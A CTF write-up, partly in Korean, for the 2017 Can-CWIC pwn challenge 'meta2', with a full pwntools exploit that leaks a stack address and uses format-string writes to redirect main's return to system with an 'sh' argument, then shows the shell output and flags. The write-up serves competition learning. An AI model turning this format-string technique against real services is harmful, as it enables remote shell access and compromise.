# [2017_Can-CWIC] \[PWN] meta2

## Key words

- Format String Bug

## Problem

```
We are so 1337 we forgot to include the second flag in the binary. Can you read it where it is?

nc 159.203.38.169 5685

Note: You should solve "Meta 1" first.
```

## Analysis

meta1의 문제와 동일합니다. meta2의 경우 서버의 shell을 따야하는 점에서 차이점이 있습니다. 바이너리 내에 system 함수가 있기 때문에 이를 활용하면됩니다.

##Exploit

```python
from pwn import *

context.clear(arch='i386')

binary = ELF('./meta')
#p = process("./meta")
p = remote("159.203.38.169", 5685)
raw_input()
print p.recvuntil("How many times have you seen the meta?\n")
p.sendline("%38$x")
print p.recvuntil("Your answer was: \n")
leaked_stack = int(p.recvline()[:-1],16)
v4 = leaked_stack - 216
v9 = v4 + 528
v8 = v4 + 524
v7 = v4 + 520
ret = v4 + 568
s = v4 + 4

payload = fmtstr_payload(6, {v9: 1948}, write_size='short')
p.sendline(payload)
p.recv()

payload = fmtstr_payload(6, {v8: 2017}, write_size='short')
p.sendline(payload)
p.recv()

payload = fmtstr_payload(6, {v7: 0xffff}, write_size='short')
p.sendline(payload)
p.recv()

payload = fmtstr_payload(6, {ret+152: int("hs".encode("hex"),16)}, write_size='short')
p.sendline(payload)
p.recv()

payload = fmtstr_payload(6, {ret+154: int("\x00".encode("hex"),16)}, write_size='short')
p.sendline(payload)
p.recv()

payload = fmtstr_payload(6, {ret: 0x83e0}, write_size='short')
p.sendline(payload)
p.recv()

payload = fmtstr_payload(6, {ret+2: 0x0804}, write_size='short')
p.sendline(payload)
p.recv()

payload = fmtstr_payload(6, {v4: 0x1}, write_size='short')
p.sendline(payload)
p.recv()


log.info("leaked stack addr : " + hex(leaked_stack))
log.info("v4 addr : "+ hex(v4))
log.info("v9 addr : "+ hex(v9))
log.info("v8 addr : "+ hex(v8))
log.info("v7 addr : "+ hex(v7))
log.info("ret addr : "+ hex(ret))
raw_input()
print p.recv()
p.interactive()
```

main 함수의 ret를 시스템 함수의 plt 주소로 조작하고 이후의 스택을 `sh`로 조작하여 함수의 인자를 넣어줬습니다. (fgets가 받는 문자열의 길이가 32로 제한되어 있는걸 안봐서 삽질을 많이 했습니다… =_=)

## Result

```
Good Job! Now, in what year did IBM demonstrate using code as data?
>
Your answer was: 
n

We might be able to work something out... in what year was this year's CCWC? Also, on a scale of 0x00 to 0xffff, what would you rate its metaprogramming quiz?
>
$ 
Your answer was: 

Congrats on winning the metaprogramming quiz! FLAG{1_4M_VerY_f0rm@tab7e_&&_s0_4dOr4bl3}
$ ls
flag2.txt
limit
meta_private
$ cat flag2.txt
FLAG{M3_Lik3z_Fr0M4tSterzz_Th3y_B3_funki3zz}
```

